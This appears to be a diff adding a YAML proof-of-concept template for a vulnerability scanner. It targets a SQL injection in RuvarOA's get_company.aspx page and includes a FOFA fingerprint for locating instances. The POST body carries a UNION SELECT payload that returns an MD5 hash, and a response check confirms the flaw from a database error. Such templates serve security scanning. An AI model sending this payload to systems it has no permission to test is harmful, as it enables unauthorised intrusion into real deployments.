@@ -1,0 +1,20 @@
+id: poc-yaml-ruvaroa-get-company-aspx-sqli
+info:
+  name: RuvarOA get_company.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ruvar-oa
+  fofa: body="txt_admin_key"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ContractManage/get_company.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&ddl_type=&ddl_field=dw_bh&txt_keyword=1'+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))--+CwAf&btnSearch=%E6%9F%A5%E8%AF%A2&pager_input=1&pager_select=20&txt_row_index=&txt_dw_id=&txt_dw_mc=&txt_dw_bh=&txt_dw_lxr=&txt_dw_dh=
+  expression: "status_code == 500 && \ncontains(body,\"在将 nvarchar 值\") &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,t2)\n"
+transport: http
